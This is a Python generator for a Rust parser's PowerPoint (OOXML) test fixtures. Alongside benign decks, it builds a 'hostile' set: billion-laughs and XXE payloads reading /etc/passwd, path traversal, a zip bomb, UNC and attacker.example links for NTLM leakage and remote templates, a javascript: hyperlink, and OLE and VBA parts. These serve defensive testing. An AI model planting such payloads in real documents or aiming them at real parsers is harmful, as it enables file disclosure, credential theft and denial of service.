#!/usr/bin/env python3
"""Generate the deterministic fixtures, and fixtures/manifest.tsv.

Fixed timestamps and order, so a checksum changes only when a fixture does.

Manifest columns: path, sha256, expectation. Expectation is `refuse:<code>`, or
`open` plus any `<code>` findings the deck must produce, space-separated. The
corpus test in crates/casual-slide-ooxml/tests/corpus.rs reads this file.

    python3 fixtures/tools/generate.py          # write
    python3 fixtures/tools/generate.py --check  # fail if a file differs from the manifest
"""
import hashlib
import io
import pathlib
import sys
import zipfile

ROOT = pathlib.Path(__file__).resolve().parents[1]
STAMP = (1980, 1, 1, 0, 0, 0)
T = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
PKG_RELS = "http://schemas.openxmlformats.org/package/2006/relationships"
PML = "application/vnd.openxmlformats-officedocument.presentationml"
NS = ('xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" '
      f'xmlns:r="{T}" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main"')
DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'


def rels(*items):
    out = [DECL, f'<Relationships xmlns="{PKG_RELS}">']
    for i, (typ, target, *mode) in enumerate(items, 1):
        full = typ if typ.startswith("http") else f"{T}/{typ}"
        m = f' TargetMode="{mode[0]}"' if mode else ""
        out.append(f'<Relationship Id="rId{i}" Type="{full}" Target="{target}"{m}/>')
    out.append("</Relationships>")
    return "".join(out)


TREE = ('<p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr/>')
SCHEME = "".join(f'<a:{n}><a:srgbClr val="{v}"/></a:{n}>' for n, v in [
    ("dk1", "000000"), ("lt1", "FFFFFF"), ("dk2", "44546A"), ("lt2", "E7E6E6"), ("accent1", "4472C4"),
    ("accent2", "ED7D31"), ("accent3", "A5A5A5"), ("accent4", "FFC000"), ("accent5", "5B9BD5"),
    ("accent6", "70AD47"), ("hlink", "0563C1"), ("folHlink", "954F72")])
FILL = '<a:solidFill><a:schemeClr val="phClr"/></a:solidFill>'
LINE = f'<a:ln w="6350">{FILL}</a:ln>'
EFFECT = "<a:effectStyle><a:effectLst/></a:effectStyle>"
THEME = (f'{DECL}<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Fixture">'
         f'<a:themeElements><a:clrScheme name="Fixture">{SCHEME}</a:clrScheme>'
         '<a:fontScheme name="Fixture"><a:majorFont><a:latin typeface="Arial"/><a:ea typeface=""/><a:cs typeface=""/></a:majorFont>'
         '<a:minorFont><a:latin typeface="Arial"/><a:ea typeface=""/><a:cs typeface=""/></a:minorFont></a:fontScheme>'
         f'<a:fmtScheme name="Fixture"><a:fillStyleLst>{FILL * 3}</a:fillStyleLst><a:lnStyleLst>{LINE * 3}</a:lnStyleLst>'
         f'<a:effectStyleLst>{EFFECT * 3}</a:effectStyleLst><a:bgFillStyleLst>{FILL * 3}</a:bgFillStyleLst></a:fmtScheme>'
         '</a:themeElements></a:theme>')
CLRMAP = ('<p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" '
          'accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>')
TITLE = ('<p:sp><p:nvSpPr><p:cNvPr id="2" name="Title 1"/><p:cNvSpPr/><p:nvPr><p:ph type="title"/></p:nvPr></p:nvSpPr>'
         '<p:spPr><a:xfrm><a:off x="838200" y="365125"/><a:ext cx="10515600" cy="1325563"/></a:xfrm>'
         '<a:prstGeom prst="rect"><a:avLst/></a:prstGeom></p:spPr>'
         '<p:txBody><a:bodyPr/><a:lstStyle/><a:p><a:r><a:rPr lang="en-US"/><a:t>%s</a:t></a:r></a:p></p:txBody></p:sp>')


def deck(slides=1, types_extra=(), slide_rels=(), presentation=None, root_extra=(), parts=(), main_type=None,
         root_type="officeDocument", title="Fixture"):
    """A minimal valid deck, as an ordered list of (name, bytes-or-str)."""
    ids = "".join(f'<p:sldId id="{256 + i}" r:id="rId{i + 3}"/>' for i in range(slides))
    pres = presentation or (f'{DECL}<p:presentation {NS}><p:sldMasterIdLst><p:sldMasterId id="2147483648" r:id="rId1"/></p:sldMasterIdLst>'
                            f'<p:sldIdLst>{ids}</p:sldIdLst><p:sldSz cx="12192000" cy="6858000"/><p:notesSz cx="6858000" cy="9144000"/></p:presentation>')
    over = [("/ppt/presentation.xml", main_type or f"{PML}.presentation.main+xml"),
            ("/ppt/slideMasters/slideMaster1.xml", f"{PML}.slideMaster+xml"),
            ("/ppt/slideLayouts/slideLayout1.xml", f"{PML}.slideLayout+xml"),
            ("/ppt/theme/theme1.xml", "application/vnd.openxmlformats-officedocument.theme+xml")]
    over += [(f"/ppt/slides/slide{i + 1}.xml", f"{PML}.slide+xml") for i in range(slides)]
    ct = [DECL, '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">',
          '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>',
          '<Default Extension="xml" ContentType="application/xml"/>',
          '<Default Extension="png" ContentType="image/png"/>']
    ct += [f'<Override PartName="{n}" ContentType="{t}"/>' for n, t in list(over) + list(types_extra)]
    ct.append("</Types>")
    out = [("[Content_Types].xml", "".join(ct)),
           ("_rels/.rels", rels((root_type, "ppt/presentation.xml"), *root_extra)),
           ("ppt/presentation.xml", pres),
           ("ppt/_rels/presentation.xml.rels", rels(("slideMaster", "slideMasters/slideMaster1.xml"), ("theme", "theme/theme1.xml"),
                                                    *[("slide", f"slides/slide{i + 1}.xml") for i in range(slides)])),
           ("ppt/slideMasters/slideMaster1.xml",
            f'{DECL}<p:sldMaster {NS}><p:cSld><p:spTree>{TREE}</p:spTree></p:cSld>{CLRMAP}'
            '<p:sldLayoutIdLst><p:sldLayoutId id="2147483649" r:id="rId1"/></p:sldLayoutIdLst></p:sldMaster>'),
           ("ppt/slideMasters/_rels/slideMaster1.xml.rels", rels(("slideLayout", "../slideLayouts/slideLayout1.xml"), ("theme", "../theme/theme1.xml"))),
           ("ppt/slideLayouts/slideLayout1.xml",
            f'{DECL}<p:sldLayout {NS} type="titleOnly"><p:cSld name="Title Only"><p:spTree>{TREE}{TITLE % "Layout"}</p:spTree></p:cSld></p:sldLayout>'),
           ("ppt/slideLayouts/_rels/slideLayout1.xml.rels", rels(("slideMaster", "../slideMasters/slideMaster1.xml"))),
           ("ppt/theme/theme1.xml", THEME)]
    for i in range(slides):
        out.append((f"ppt/slides/slide{i + 1}.xml",
                    f'{DECL}<p:sld {NS}><p:cSld><p:spTree>{TREE}{TITLE % f"{title} {i + 1}"}</p:spTree></p:cSld></p:sld>'))
        out.append((f"ppt/slides/_rels/slide{i + 1}.xml.rels",
                    rels(("slideLayout", "../slideLayouts/slideLayout1.xml"), *slide_rels)))
    out += list(parts)
    return out


def zipped(entries, method=zipfile.ZIP_DEFLATED):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", method) as z:
        for name, data in entries:
            info = zipfile.ZipInfo(name, STAMP)
            info.compress_type = method
            info.external_attr = 0
            z.writestr(info, data.encode("utf8") if isinstance(data, str) else data)
    return buf.getvalue()


def replace(entries, name, data):
    return [(n, data if n == name else d) for n, d in entries]


def vba_deck():
    entries = deck(main_type="application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml",
                   parts=[("ppt/vbaProject.bin", b"x")],
                   types_extra=[("/ppt/vbaProject.bin", "application/vnd.ms-office.vbaProject")])
    return zipped(replace(entries, "ppt/_rels/presentation.xml.rels", rels(
        ("slideMaster", "slideMasters/slideMaster1.xml"), ("theme", "theme/theme1.xml"), ("slide", "slides/slide1.xml"),
        ("http://schemas.microsoft.com/office/2006/relationships/vbaProject", "vbaProject.bin"))))


def strict(entries):
    """Transitional to Strict by namespace mapping alone. **Synthetic:** nothing here
    was saved by PowerPoint, so it shows we follow the schema, not what Office writes."""
    pairs = [(T, "http://purl.oclc.org/ooxml/officeDocument/relationships"),
             ("http://schemas.openxmlformats.org/drawingml/2006/main", "http://purl.oclc.org/ooxml/drawingml/main"),
             ("http://schemas.openxmlformats.org/presentationml/2006/main", "http://purl.oclc.org/ooxml/presentationml/main")]
    out = []
    for name, data in entries:
        for transitional, mapped in pairs:
            data = data.replace(transitional, mapped)
        out.append((name, data))
    return out


def fixtures():
    bomb_laughs = (f'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
                   f'<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><p:presentation {NS}>&c;</p:presentation>')
    xxe = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
    png = bytes.fromhex("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d49444154789c6360000002000001"
                        "e221bc330000000049454e44ae426082")

    yield "generated/minimal.pptx", zipped(deck()), "open"
    yield "generated/three-slides.pptx", zipped(deck(3)), "open"
    yield "generated/stored-not-deflated.pptx", zipped(deck(), zipfile.ZIP_STORED), "open"
    yield "generated/image.pptx", zipped(deck(slide_rels=[("image", "../media/image1.png")], parts=[("ppt/media/image1.png", png)])), "open"
    yield "generated/slideshow.ppsx", zipped(deck(main_type=f"{PML}.slideshow.main+xml")), "open"
    yield "generated/template.potx", zipped(deck(main_type=f"{PML}.template.main+xml")), "open"
    # UTF-16 is legal in OPC, and a reader that assumes UTF-8 sees garbage.
    utf16 = deck()
    utf16 = replace(utf16, "_rels/.rels", b"\xff\xfe" + rels(("officeDocument", "ppt/presentation.xml")).replace("UTF-8", "UTF-16").encode("utf-16-le"))
    yield "generated/utf16-rels.pptx", zipped(utf16), "open"
    # Relationships spelled in a different case from the entries.
    cased = [(n.replace("ppt/slides/slide1", "ppt/Slides/Slide1"), d) for n, d in deck()]
    yield "generated/case-differs.pptx", zipped(cased), "open"

    # OPC-01: one part, spelled differently by its relationship and its ZIP item.
    yield "generated/percent-encoded-names.pptx", zipped(deck(
        slide_rels=[("image", "../media/my image.png"), ("image", "../media/é.png"), ("slide", "slide 2.xml")],
        parts=[("ppt/media/my%20image.png", png), ("ppt/media/%C3%A9.png", png),
               ("ppt/slides/slide%202.xml", f"{DECL}<p:sld {NS}><p:cSld><p:spTree>{TREE}</p:spTree></p:cSld></p:sld>"),
               ("ppt/slides/_rels/slide%202.xml.rels", rels(("image", "../media/my%20image.png")))])), "open"
    yield "generated/percent-encoded-targets.pptx", zipped(deck(
        slide_rels=[("image", "../media/my%20image.png"), ("image", "../media/%c3%a9.png")],
        parts=[("ppt/media/my image.png", png), ("ppt/media/é.png", png)])), "open"
    # MCE-01: a Choice this engine does not understand, in front of a valid Fallback.
    mc_ns = ('xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" '
             'xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" mc:Ignorable="p14"')
    alternate = (f'<mc:AlternateContent><mc:Choice Requires="p14"><p14:notInAnySchema/></mc:Choice>'
                 f'<mc:Fallback>{TITLE % "Fallback"}</mc:Fallback></mc:AlternateContent>')
    yield "generated/mce-alternate-content.pptx", zipped(replace(deck(), "ppt/slides/slide1.xml",
        f'{DECL}<p:sld {NS} {mc_ns}><p:cSld p14:ignored="1"><p:spTree>{TREE}{alternate}</p:spTree></p:cSld></p:sld>')), "open"
    # STRICT-01: synthetic. The name says so, since no PowerPoint-saved Strict deck exists here yet.
    yield "generated/strict-synthetic.pptx", zipped(strict(deck(2))), "open"

    hostile = {
        "doctype-billion-laughs": (zipped(replace(deck(), "ppt/presentation.xml", bomb_laughs)), "refuse:CS-XML-0005"),
        "doctype-xxe-in-rels": (zipped(replace(deck(), "_rels/.rels", xxe + rels(("officeDocument", "ppt/presentation.xml")).replace(DECL, ""))), "refuse:CS-XML-0005"),
        "doctype-xxe-in-content-types": (zipped(replace(deck(), "[Content_Types].xml", xxe + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>')), "refuse:CS-XML-0005"),
        "undeclared-entity": (zipped(replace(deck(), "ppt/presentation.xml", f"<p:presentation {NS}>&evil;</p:presentation>")), "refuse:CS-XML-0004"),
        "deep-nesting": (zipped(replace(deck(), "ppt/presentation.xml", f"<p:presentation {NS}>" + "<a>" * 5000 + "</a>" * 5000 + "</p:presentation>")), "refuse:CS-XML-0002"),
        "unclosed-element": (zipped(replace(deck(), "ppt/presentation.xml", f"<p:presentation {NS}><a>")), "refuse:CS-XML-0004"),
        "two-roots": (zipped(replace(deck(), "ppt/presentation.xml", f"<p:presentation {NS}/><p:presentation {NS}/>")), "refuse:CS-XML-0004"),
        "wrong-main-root": (zipped(replace(deck(), "ppt/presentation.xml", "<workbook/>")), "refuse:CS-XML-0004"),
        "repeated-relationship-id": (zipped(replace(deck(), "_rels/.rels", rels(("officeDocument", "ppt/presentation.xml")).replace("</Relationships>", f'<Relationship Id="rId1" Type="{T}/slide" Target="x"/></Relationships>'))), "refuse:CS-XML-0004"),
        "content-type-conflict": (zipped(replace(deck(), "[Content_Types].xml", '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="a/b"/><Default Extension="xml" ContentType="c/d"/></Types>')), "refuse:CS-XML-0004"),
        "main-is-workbook": (zipped(deck(main_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml")), "refuse:CS-OPC-0004"),
        "no-content-types": (zipped([e for e in deck() if e[0] != "[Content_Types].xml"]), "refuse:CS-OPC-0001"),
        "no-root-rels": (zipped([e for e in deck() if e[0] != "_rels/.rels"]), "refuse:CS-OPC-0001"),
        "main-part-missing": (zipped([e for e in deck() if e[0] != "ppt/presentation.xml"]), "refuse:CS-OPC-0001"),
        # A main relationship in a look-alike namespace must not be believed.
        "spoofed-office-document-type": (zipped(deck(root_type="http://example.com/evil/officeDocument")), "refuse:CS-OPC-0001"),
        "compound-file": (bytes.fromhex("d0cf11e0a1b11ae1") + b"\0" * 504, "refuse:CS-OPC-0005"),
        "not-a-zip": (b"this is not a package", "refuse:CS-PKG-0005"),
        "path-traversal": (zipped(deck(parts=[("../../etc/evil.xml", "<a/>")])), "refuse:CS-PKG-0004"),
        "case-colliding-parts": (zipped(deck(parts=[("PPT/PRESENTATION.XML", "<a/>")])), "refuse:CS-PKG-0007"),
        "zip-bomb": (zipped(deck(parts=[("ppt/media/bomb.bin", b"\0" * (64 << 20))])), "refuse:CS-PKG-0003"),
        "percent-equivalent-parts": (zipped(deck(parts=[("ppt/media/a b.png", png), ("ppt/media/a%20b.png", b"other")])), "refuse:CS-PKG-0007"),
        "mce-must-understand-unknown": (zipped(replace(deck(), "ppt/presentation.xml", f'{DECL}<p:presentation {NS} xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:x="urn:unknown" mc:MustUnderstand="x"/>')), "refuse:CS-MCE-0001"),
        "mce-nonconformant-main": (zipped(replace(deck(), "ppt/presentation.xml", f'{DECL}<p:presentation {NS} xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="undeclared"/>')), "open CS-FND-0012"),
        "rel-percent-traversal": (zipped(deck(slide_rels=[("image", "../%2e%2e/%2e%2e/etc/passwd"), ("image", "..%2f..%2fetc%2fpasswd"), ("image", "%252e%252e/x.png"), ("image", "%c0%ae%c0%ae/x.png"), ("image", "..\\..\\x.png")])), "open CS-FND-0011"),
        "part-name-undecodable": (zipped(deck(parts=[("ppt/media/%ff.png", png)])), "open CS-FND-0005 CS-FND-0011"),
        # These open: nothing is followed, and the report names them.
        "external-image-tracking": (zipped(deck(slide_rels=[("image", "https://tracker.example/pixel.png", "External")])), "open CS-FND-0001"),
        "external-image-unc-ntlm": (zipped(deck(slide_rels=[("image", "\\\\attacker.example\\share\\a.png", "External")])), "open CS-FND-0001"),
        "remote-template": (zipped(deck(slide_rels=[("attachedTemplate", "https://attacker.example/t.potx", "External")])), "open CS-FND-0001"),
        "link-javascript": (zipped(deck(slide_rels=[("hyperlink", "java&#9;script:alert(1)", "External")])), "open CS-FND-0002"),
        "link-unc": (zipped(deck(slide_rels=[("hyperlink", "\\\\attacker.example\\s", "External")])), "open CS-FND-0002"),
        "rel-above-package-root": (zipped(deck(slide_rels=[("image", "../../../../etc/passwd")])), "open CS-FND-0003"),
        "rel-dangling": (zipped(deck(slide_rels=[("image", "../media/none.png")])), "open CS-FND-0004"),
        "rel-cycle": (zipped(deck(slide_rels=[("slide", "slide1.xml")])), "open"),
        "orphan-part": (zipped(deck(parts=[("ppt/hidden/stash.xml", "<a/>")])), "open CS-FND-0005"),
        "undeclared-type": (zipped(deck(parts=[("ppt/media/x.unknownext", b"x")], slide_rels=[("image", "../media/x.unknownext")])), "open CS-FND-0006"),
        "unknown-rel-type": (zipped(deck(slide_rels=[("http://example.com/custom", "../media/none.png", "External")])), "open CS-FND-0001 CS-FND-0007"),
        "embedded-object": (zipped(deck(slide_rels=[("oleObject", "../embeddings/o.bin")], parts=[("ppt/embeddings/o.bin", b"x")], types_extra=[("/ppt/embeddings/o.bin", "application/vnd.openxmlformats-officedocument.oleObject")])), "open CS-FND-0010"),
        "vba-project": (vba_deck(), "open CS-FND-0008"),
    }
    for name, (data, expect) in hostile.items():
        yield f"hostile/{name}.bin", data, expect


def check():
    """Committed bytes against the manifest. Deliberately not a regeneration, since
    deflate output can differ between zlib versions."""
    rows = [ln.split("\t") for ln in (ROOT / "manifest.tsv").read_text().splitlines()[1:]]
    listed = {r[0] for r in rows}
    bad = [r[0] for r in rows if not (ROOT / r[0]).exists() or hashlib.sha256((ROOT / r[0]).read_bytes()).hexdigest() != r[1]]
    stray = [str(p.relative_to(ROOT)) for d in ("generated", "hostile", "producers") for p in (ROOT / d).glob("*") if str(p.relative_to(ROOT)) not in listed and p.name != "expect.tsv"]
    if bad or stray:
        raise SystemExit(f"fixtures differ from manifest: {bad} unlisted: {stray}")
    print(f"fixtures match manifest: {len(rows)}")


def main():
    if "--check" in sys.argv:
        check()
        return
    lines = ["path\tsha256\texpect\n"]
    for rel, data, expect in fixtures():
        path = ROOT / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        lines.append(f"{rel}\t{hashlib.sha256(data).hexdigest()}\t{expect}\n")
    # Decks written by other software are committed, never regenerated.
    for row in (ROOT / "producers/expect.tsv").read_text().splitlines():
        name, expect = row.split("\t")
        rel = f"producers/{name}"
        lines.append(f"{rel}\t{hashlib.sha256((ROOT / rel).read_bytes()).hexdigest()}\t{expect}\n")
    (ROOT / "manifest.tsv").write_text("".join(lines))
    print(f"wrote {len(lines) - 1} fixtures")


if __name__ == "__main__":
    main()
